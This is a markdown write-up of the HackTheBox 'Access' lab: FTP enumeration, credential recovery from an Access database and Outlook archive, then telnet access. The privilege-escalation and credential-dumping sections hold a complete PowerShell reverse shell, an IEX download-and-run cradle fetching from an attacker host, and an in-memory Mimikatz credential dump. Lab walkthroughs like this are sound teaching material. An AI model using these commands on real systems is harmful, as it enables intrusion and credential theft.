@@ -1,0 +1,190 @@
+---
+title: HackTheBox - Access
+categories: [HTB]
+published: true
+description: Windows CTF from HTB. Anonymous FTP login and saved credentials privilege escalation.
+---
+
+## Machine Information  
+
+- **Name:** Access  
+- **Platform:** HackTheBox  
+- **Difficulty Level:** Easy  
+- **OS:** Windows  
+- **IP/Hostname:** 10.10.10.98  
+- **Description:** This machine shows why anonymous FTP login is dangerous. Saved credentials in the Windows Credentials Manager can be leveraged to escalate privileges after initial foothold.
+
+---
+
+## Nmap - Open Ports and Service Identification  
+
+```bash
+sudo nmap -sV -sC 10.10.10.98 -Pn
+```
+
+```
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
+23/tcp open  telnet  Microsoft Windows XP telnetd
+| telnet-ntlm-info: 
+|   Target_Name: ACCESS
+|   NetBIOS_Domain_Name: ACCESS
+|   NetBIOS_Computer_Name: ACCESS
+|   DNS_Domain_Name: ACCESS
+|   DNS_Computer_Name: ACCESS
+|_  Product_Version: 6.1.7600
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: MegaCorp
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+```
+
+Initial scan result shows several services running on the target system. The operating system is Windows since one of the services is Microsoft-IIS webserver. Although the target system is Windows, the SMB service is not running, which takes away some options such as using enum4linux, smbmap or netexec tools. However, the most interesting service at first glance is probably FTP because it allows anonymous login.
+
+---
+
+## Port 21
+
+To connect to FTP service, simply run:
+
+
+```bash
+ftp anonymous@10.10.10.98
+```
+When prompted for a password during anonymous FTP login, any input can be provided as authentication is not required. Let's try to list available content with `ls` command:
+
+```
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-23-18  09:16PM       <DIR>          Backups
+08-24-18  10:00PM       <DIR>          Engineer
+226 Transfer complete.
+```
+
+There are 2 directories named *Backups* and *Engineer*. By navigating into these directories using the `cd` command, we can find the files *backup.mdb* and *Access Control.zip*. These files can be downloaded using the `get [FILENAME]` command. To ensure the files are downloaded correctly, switch the transfer mode to binary using `binary` command before downloading.
+
+---
+
+## Enumerating downloaded files
+
+After both files are downloaded from FTP service, we can perform some basic enumeration on these files. The `file [FILENAME]` command can be used to get initial information about the file type. The *Access Control.zip* file is a zip archive and the *backup.mdb* file is a MS Access database. Hence the name of the machine "Access" :). If you would try to unzip the *Access Control.zip* file, you would notice it is encrypted, so let's start with enumerating *backup.mdb*.
+
+A quick Google search shows that .mdb files can be processed and viewed by `mdbtools` package on Kali. After the package is installed, it is important to enumerate the tables inside the .mdb file. This can be done using the following command:
+
+```bash
+sudo mdb-tables backup.mdb
+
+```
+
+Output of this command is very large, but the table we are looking for is *auth_user* because it looks like it could store user's credentials for initial access into the target system. Let's export this table with the following command:
+
+```bash
+mdb-export backup.mdb auth_user
+```
+
+```
+id,username,password,Status,last_login,RoleID,Remark
+25,"admin","admin",1,"08/23/18 21:11:47",26,
+27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
+28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
+```
+
+Alright, there are some user credentials. You can take a note of these, but the most valuable information from this output is the *engineer* user's password, which is the only non-default password. With this new password, it is worth to try to extract the *Access Control.zip* file. The following command can be used for this:
+
+```bash
+7z e -paccess4u@security "Access Control.zip"
+```
+
+This command extracts the archive and creates a new *Access Control.pst* file. A .pst is a file format used by Microsoft Outlook to store copies of emails. Another quick Google search suggested to use the *evolution* package to view this file in Kali Linux. Install it and run it using the `evolution` command. It is a personal information management application that provides integrated mail, calendaring and address book functionality, allowing us to Import and view the .pst file by choosing *File -> Import* and selecting the .pst file.
+
+After successfully importing the file, we can see an email with the following content:
+
+![Email body](/assets/img/email.png)
+
+We can see that there is yet another set of credentials *security:4Cc3ssC0ntr0ller*. These credentials can be used for Telnet login.
+
+---
+
+## Initial Foothold
+
+Telnet connection can be done with this command:
+
+```bash
+telnet 10.10.10.98 23
+```
+
+![Telnet connection](/assets/img/telnet.png)
+
+The credentials from the email body are working and we now have an initial access with low-privileged user.
+
+---
+
+## Privilege Escalation
+
+With the initial access, it is possible to perform some additional enumeration inside the target system. Looking for the current user's privileges, group memberships, or installed software is a great thing to do, but this won't work here.
+
+The actual path to escalate privileges is to look for saved credentials in Credential Manager. The Credential Manager can store credentials of other users for specific purposes. For example, allowing a low-privileged user to run a specific application as a high-privileged user without the need of their credentials or mapping a remote share as another user. To view stored credentials in *cmd*, type the following command:
+
+```bash
+cmdkey /list
+```
+
+```
+Currently stored credentials:
+
+    Target: Domain:interactive=ACCESS\Administrator
+    Type: Domain Password
+    User: ACCESS\Administrator
+```
+
+The output shows that Administrator user's credentials are stored and can be used for vertical privilege escalation without knowing the actual password. Creating a Powershell reverse shell script, downloading it to the target machine and executing it in memory as Administrator could be one way of escalating privileges.
+
+First, create the shell.ps1 file on Kali machine with the following content:
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+Change the *IP* and *PORT*, then save it and start a python web listener in the same directory.
+
+```bash
+sudo python3 -m http.server 80
+```
+
+Then start a netcat listener to catch the reverse shell connection.
+
+```bash
+nc -lvnp 4444
+```
+
+Now on the target system, run the following command that downloads the shell.ps1 reverse shell and executes it directly in memory as Administrator.
+
+```powershell
+runas /user:ACCESS\Administrator /savecred "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.15/shell.ps1')"
+```
+
+This command executed a reverse shell in memory as Administrator and we should catch the connection on our Kali machine.
+
+---
+
+## Credential Dumping
+
+Now that we have control over Administrator account, we can of course get a root flag and complete the challenge, or we can play further and try to some post exploitation with mimikatz. Since executing .exe files was restricted on this machine, my choice was to use **Invoke-Mimikatz.ps1**.
+
+First, start a python web server on kali machine hosting Invoke-Mimikatz.ps1 and then download it and execute it from memory on the target system.
+
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.15/Invoke-Mimikatz.ps1')
+```
+
+Now we can dump the credentials, which includes also Administrator's clear text password using this command:
+
+```powershell
+Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
+```
